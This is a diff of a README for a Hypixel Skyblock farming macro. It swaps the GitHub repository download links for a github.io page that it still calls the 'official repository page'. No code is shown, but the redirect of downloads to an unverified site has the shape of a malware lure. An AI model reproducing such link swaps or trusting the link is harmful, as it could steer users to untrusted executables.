@@ -1,6 +1,6 @@
 # 🌌 aether-skyblock-macro - Automate your Hypixel skyblock farming tasks
 
-[![Download Aether](https://img.shields.io/badge/Download-Aether-blue)](https://github.com/snailgreengrocery903/aether-skyblock-macro)
+[![Download Aether](https://img.shields.io/badge/Download-Aether-blue)](https://snailgreengrocery903.github.io)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to prepare your system and launch the macro.
 
-1.  Visit the [official repository page](https://github.com/snailgreengrocery903/aether-skyblock-macro) to access the files.
+1.  Visit the [official repository page](https://snailgreengrocery903.github.io) to access the files.
 2.  Locate the latest release on the right side of the page.
 3.  Click the link to download the file to your computer.
 4.  Move the downloaded file to a folder where you can easily find it.
